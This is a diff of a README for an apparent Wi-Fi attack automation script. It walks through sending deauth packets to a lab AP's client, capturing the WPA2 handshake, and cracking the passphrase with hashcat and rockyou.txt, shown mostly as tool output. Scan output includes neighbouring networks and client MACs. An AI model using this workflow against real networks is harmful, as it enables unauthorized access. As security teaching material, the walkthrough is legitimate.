@@ -5,28 +5,29 @@ Before running the script `wifi-attack-automation-tool.py`, it is essential to h
 Once the necessary privileges have been obtained, proceed to execute the script using the following command:
 
 ```
-# python3 wifi-attack-automation-tool.py
+# wifi-attack-automation-tool.py
 ```
 
 The script itself will verify whether the required **Python packages and system tools** are installed for proper operation.
 
 ```
-# python3 wifi-attack-automation-tool.py
-[2025-06-26 23:12:05.999] <inf> Verifying required Python packages:
-[2025-06-26 23:12:05.999] <inf> print_helper_logger is installed
-[2025-06-26 23:12:05.999] <inf> scapy is installed
-[2025-06-26 23:12:05.999] <inf> deauth_lib is available
-[2025-06-26 23:12:05.999] <inf> All required Python packages are ready
-[2025-06-26 23:12:06.272] <inf> Verifying required tools:
-[2025-06-26 23:12:06.272] <inf> iw found
-[2025-06-26 23:12:06.272] <inf> ifconfig found
-[2025-06-26 23:12:06.272] <inf> iwconfig found
-[2025-06-26 23:12:06.272] <inf> airodump-ng found
-[2025-06-26 23:12:06.272] <inf> hcxpcapngtool found
-[2025-06-26 23:12:06.272] <inf> hashcat found
-[2025-06-26 23:12:06.272] <inf> All tools are ready. System check passed
-[2025-06-26 23:12:06.279] <inf> Interfaces that support monitor mode:
-[2025-06-26 23:12:06.279] <inf> 1)   wlx00e0202d05b8
+# ./wifi-attack-automation-tool.py 
+[2025-06-27 20:27:56.685] <inf> Verifying required Python packages:
+[2025-06-27 20:27:56.685] <inf> print_helper_logger is installed
+[2025-06-27 20:27:56.685] <inf> scapy is installed
+[2025-06-27 20:27:56.685] <inf> deauth_lib is available
+[2025-06-27 20:27:56.685] <inf> All required Python packages are ready
+[2025-06-27 20:27:56.948] <inf> Verifying required tools:
+[2025-06-27 20:27:56.948] <inf> iw found
+[2025-06-27 20:27:56.948] <inf> ifconfig found
+[2025-06-27 20:27:56.949] <inf> iwconfig found
+[2025-06-27 20:27:56.949] <inf> airodump-ng found
+[2025-06-27 20:27:56.949] <inf> hcxpcapngtool found
+[2025-06-27 20:27:56.949] <inf> hashcat found
+[2025-06-27 20:27:56.949] <inf> All tools are ready. System check passed
+[2025-06-27 20:27:56.955] <inf> Interfaces that support monitor mode:
+[2025-06-27 20:27:56.955] <inf> 1.   wlx00e0202d05b8
+Select an interface by number: 1
 ```
 
 Next, a list of available **network interfaces capable of monitor mode** will be displayed. You must select the desired one; in our case, it is the interface named `wlx00e0202d05b8`, so we choose **option number 1**.
@@ -38,68 +39,54 @@ At this point, the script will:
   - Devices connected to them.
 
 ```
-CH  9 ][ Elapsed: 1 min ][ 2025-06-26 23:26 
+ CH  1 ][ Elapsed: 12 s ][ 2025-06-27 20:28 
 
-BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 
-60:8D:26:FA:ED:11   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-E4:AB:89:9B:46:C2   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-88:DE:7C:A2:91:9F   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-CC:D4:A1:83:05:2F   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-4C:1B:86:AB:63:3D   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-EC:F4:51:7B:45:BB   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-28:9E:FC:3E:19:36   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-50:09:59:F2:BE:A9   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-2C:96:82:DD:4F:80  -58      234       20    0   6  648   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80                                                                                                             
-EC:BE:DD:AD:08:96  -57      256      160    0   9  195   WPA2 CCMP   PSK  HACK_ME                                                                                                                         
-F4:1E:57:06:AA:F3  -70      128       40    0   1  360   WPA3 CCMP   SAE  OSCVER                                                                                                                          
-34:60:F9:6A:95:62  -70      229        5    0   6  130   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80_EXT                                                                                                         
-D0:57:94:70:24:76   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-0C:01:4B:3E:E2:AE   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
-DC:51:93:D5:0A:F2   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
+ D0:57:94:70:24:76   -1        0        0    0  -1   -1                    <length:  0>
+ CC:D4:A1:83:05:2F   -1        0        0    0  -1   -1                    <length:  0>
+ 88:DE:7C:A2:91:9F   -1        0        0    0  -1   -1                    <length:  0>
+ 60:8D:26:FA:ED:11   -1        0        0    0  -1   -1                    <length:  0>
+ DC:51:93:D5:0A:F2   -1        0        0    0  -1   -1                    <length:  0>
+ 2C:96:82:DD:4F:80  -52       38        4    0   6  648   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80
+ EC:BE:DD:AD:08:96  -60       44       12    0   9  195   WPA2 CCMP   PSK  HACK_ME
+ 34:60:F9:6A:95:62  -68       39        2    0   6  130   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80_EXT
+ F4:1E:57:06:AA:F3  -69       19        6    0   1  360   WPA3 CCMP   SAE  OSCVER
 
-BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 
-2C:96:82:DD:4F:80  EC:0B:AE:6E:CE:B1  -61    0 - 1e     0        1                                                                                                                                         
-2C:96:82:DD:4F:80  B8:50:D8:32:24:A8  -67    6e- 1e     0        3                                                                                                                                         
-2C:96:82:DD:4F:80  F4:CE:46:52:FD:7E  -69    0 -36e     0       13                                                                                                                                         
-2C:96:82:DD:4F:80  36:60:F9:0A:95:62  -71    6e- 1e     1       18                                                                                                                                         
-EC:BE:DD:AD:08:96  F6:B1:11:45:98:25  -61    0 - 1e     0      182                                                                                                                                         
-F4:1E:57:06:AA:F3  5A:A7:05:F0:B2:D0  -57    1e- 1e     2      175                                                                                                                                         
-F4:1E:57:06:AA:F3  44:07:0B:A9:BD:11  -57    1e- 1e     0       32         OSCVER                                                                                                                          
-F4:1E:57:06:AA:F3  F0:FE:6B:C0:F9:28  -61    1e- 1      9       11                                                                                                                                         
-D0:57:94:70:24:76  CC:8C:BF:3C:38:05  -61    0 - 1     25      860                                                                                                                                         
-(not associated)   D4:8D:26:2D:3C:3F  -75    0 - 1      0        1         Lowi753D                                                                                                                        
-Quitting...
+ 60:8D:26:FA:ED:11  CC:8C:BF:3C:38:05  -57    0 - 1     13      107     
+ (not associated)   68:A0:3E:4E:E3:F9  -61    0 - 1      0       13    
+ 2C:96:82:DD:4F:80  EC:0B:AE:6E:CE:B1  -57    0 - 1e     0        1   
+ 2C:96:82:DD:4F:80  F4:CE:46:52:FD:7E  -73   54e- 1      0        3   
+ 2C:96:82:DD:4F:80  36:60:F9:0A:95:62  -73    0 - 1e     0        2   
+ EC:BE:DD:AD:08:96  F6:B1:11:45:98:25  -51    0 - 1e   528       49    
+ F4:1E:57:06:AA:F3  EE:12:4A:F6:F6:4E  -33    0 -24      0        6   
+ F4:1E:57:06:AA:F3  44:07:0B:A9:BD:11  -57    0 - 1e     0        2
 ```
 
-Once the **target network** has been identified (for example, the AP `HACK_ME` with BSSID `EC:BE:DD:AD:08:96`), we also select the **associated device** to which we will send **DeAuth packets**.
+Once the **target network** has been identified (for example, the AP `HACK_ME` with BSSID `EC:BE:DD:AD:08:96`), we also select the **associated device** to which we will send **DeAuth packets**. In this example, the device `F6:B1:11:45:98:25`.
 
 The objective is to **force its disconnection** in order to capture the **handshake** when it attempts to reconnect.
 
 By stopping the scan with `Ctrl+C`, the script will analyze the devices connected to valid access points and display a list of them.
 
-
 ```
 Quitting...
-[2025-06-26 23:26:27.691] <wrn> (airodump-ng) Execution interrupted by user (CTRL+C)
-[2025-06-26 23:26:27.691] <inf> 📋 Available targets with valid channels:
-[2025-06-26 23:26:27.691] <inf> 1) 36:60:F9:0A:95:62 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
-[2025-06-26 23:26:27.691] <inf> 2) F4:CE:46:52:FD:7E → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
-[2025-06-26 23:26:27.691] <inf> 3) B8:50:D8:32:24:A8 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
-[2025-06-26 23:26:27.691] <inf> 4) EC:0B:AE:6E:CE:B1 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
-[2025-06-26 23:26:27.691] <inf> 5) F0:FE:6B:C0:F9:28 → BSSID: F4:1E:57:06:AA:F3 (Channel 1)
-[2025-06-26 23:26:27.691] <inf> 6) F6:B1:11:45:98:25 → BSSID: EC:BE:DD:AD:08:96 (Channel 9)
-[2025-06-26 23:26:27.691] <inf> 7) 44:07:0B:A9:BD:11 → BSSID: F4:1E:57:06:AA:F3 (Channel 1)
-[2025-06-26 23:26:27.691] <inf> 8) 5A:A7:05:F0:B2:D0 → BSSID: F4:1E:57:06:AA:F3 (Channel 1)
+[2025-06-27 20:28:17.570] <wrn> (airodump-ng) Execution interrupted by user (CTRL+C)
+[2025-06-27 20:28:17.570] <inf> 📋 Available targets with valid channels:
+[2025-06-27 20:28:17.570] <inf> 1) F4:CE:46:52:FD:7E → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
+[2025-06-27 20:28:17.570] <inf> 2) F6:B1:11:45:98:25 → BSSID: EC:BE:DD:AD:08:96 (Channel 9)
+[2025-06-27 20:28:17.570] <inf> 3) EC:0B:AE:6E:CE:B1 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
+Enter the number of the client to target:
 ```
 
-We will then be prompted to **select the device to attack**, i.e., the one to which we will send the DeAuth packets. In this case, we select **option number 6**.
+We will then be prompted to **select the device to attack**, i.e., the one to which we will send the DeAuth packets. In this case, we select **option number 2**.
 
 ```
-Enter the number of the client to target: 6
-[2025-06-26 23:37:29.852] <inf> 🎯 Target selected: F6:B1:11:45:98:25 → AP: EC:BE:DD:AD:08:96 on channel 9
-Enter number of DeAuth packets to send [default: 25]:
+Enter the number of the client to target: 2
+[2025-06-27 20:28:20.822] <inf> 🎯 Target selected: F6:B1:11:45:98:25 → AP: EC:BE:DD:AD:08:96 on channel 9
+Enter number of deauth packets to send [default: 25]:
 ```
 
 Next, we need to specify **how many DeAuth packets** we want to send:
@@ -110,36 +97,65 @@ Once the number of packets is confirmed:
 - A process will open using `airodump-ng` to **listen on the channel** corresponding to the selected AP (in this example, **channel 9**).
 - Simultaneously, another process will start to **send the DeAuth packets**.
 
+```
+ CH  9 ][ Elapsed: 12 s ][ 2025-06-27 20:28 ][ WPA handshake: EC:BE:DD:AD:08:96
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ EC:BE:DD:AD:08:96  -61   0       89       13    0   9  195   WPA2 CCMP   PSK  HACK_ME
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ EC:BE:DD:AD:08:96  F6:B1:11:45:98:25  -45    1e-11      0       60  PMKID
+ EC:BE:DD:AD:08:96  CC:8C:BF:3C:38:05  -61    0 - 1     36       24    
+```
+
 After the attack is completed, the **capture process will automatically close**.
 
 ```
 Sent 25 packets.
-[2025-06-26 23:39:22.142] <inf> Stopping handshake capture...
-
+[2025-06-27 20:28:36.476] <inf> Stopping handshake capture...
 ```
 
 Subsequently, the tool `hcxpcapngtool` will be used to **convert the `.cap` file generated by `airodump-ng` into a hash format**.
 
 ```
-[2025-06-26 23:39:22.156] <inf> Convert pcap to hash using hcxpcapngtool
-[2025-06-26 23:39:22.166] <inf> (hcxpcapngtool) Conversion successful: /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000
-[2025-06-26 23:39:22.166] <inf> /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000: WPA*01*70b128dd915b8008211276e7673bfcae*ecbeddad0896*f6b111459825*4841434b5f4d45***
-WPA*02*f6c00ee66cd21f652adba752abe9149e*ecbeddad0896*f6b111459825*4841434b5f4d45*9005aa9a8b4f40769756c183aa1f2399d43bc46c0609731c017c1c1721b3a4d5*0103007502010a000000000000000000224d2532781f3de8856dc001f71a35312f3af13e32871a8dddb332179932600314000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*a2
+[2025-06-27 20:28:36.492] <inf> Convert pcap to hash using hcxpcapngtool
+[2025-06-27 20:28:36.500] <inf> (hcxpcapngtool) Conversion successful: /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000
+[2025-06-27 20:28:36.500] <inf> /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000: WPA*01*70b128dd915b8008211276e7673bfcae*ecbeddad0896*f6b111459825*4841434b5f4d45***
+WPA*02*99ce70ae05369a5d6ec44d7994b8c057*ecbeddad0896*f6b111459825*4841434b5f4d45*9d1be82bcaf2959f56f5f8590cf74329ed4366a4ff8f4f9ee8e65149bd079ef6*0103007502010a0000000000000000001214224b234a0f9cad89d23411447194488f4f405dfda032e44930ec793b934e8e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*00
 ```
 
-With the hash file prepared, the tool `hashcat` will be used along with the password list `rockyou.txt` to **perform a brute-force attack** in an attempt to **crack the password**.
+The next step is to select the wordlist you want to use for brute force:
+
+```
+[2025-06-27 20:28:36.500] <inf> Trying to crack the hash using Hashcat
+[2025-06-27 20:28:36.500] <inf> Available wordlists:
+[2025-06-27 20:28:36.500] <inf> 1. rockyou.txt
+[2025-06-27 20:28:36.500] <inf> 2. alleged-gmail-with-count.txt
+[2025-06-27 20:28:36.500] <inf> 3. 500-worst-passwords.txt
+[2025-06-27 20:28:36.500] <inf> 4. hotmail.txt
+[2025-06-27 20:28:36.500] <inf> 5. No search password
+Select the wordlist you want to use: 1
+```
+
+Once you have selected the wordlist, and with the hash file ready, the tool `hashcat` will be used along with the password list `rockyou.txt` to **perform a brute-force attack** in an attempt to **crack the password**.
 
 > ⏳ **Note:** The time required will depend on the size of the wordlist.
 
 ```
-[2025-06-26 23:39:22.166] <inf> Trying to crack the hash using Hashcat (this task may take several minutes)...
+[2025-06-27 20:28:50.588] <inf> You selected: /home/oscargomezf/GIT/wifi-attack-automation-tool/wordlists/rockyou.txt
+[2025-06-26 20:28:50.798] <inf> This task may take several minutes...
 [2025-06-26 23:41:57.437] <wrn> Password found: pipeylaura
-[2025-06-26 23:41:57.437] <inf> Restoring interface to mode: managed
 ```
 
 Finally, if the process is successful, the **recovered password will be displayed** (for example, `pipeylaura`).
 
 As a **final step**, the script will **return the WiFi interface to its original state**.
+
+```
+[2025-06-26 23:41:57.437] <inf> Restoring interface to mode: managed
+```
 
 ---
 
@@ -149,4 +165,4 @@ As a **final step**, the script will **return the WiFi interface to its original
 
 - **Note 2:** The router with SSID `HACK_ME` has been prepared **exclusively for this practice**.
   - **Security:** WPA + WPA2
-  - **Key:** Randomly selected from the `rockyou.txt` wordlist.
+  - **Key:** Randomly selected from the `rockyou.txt` wordlist: pipeylaura
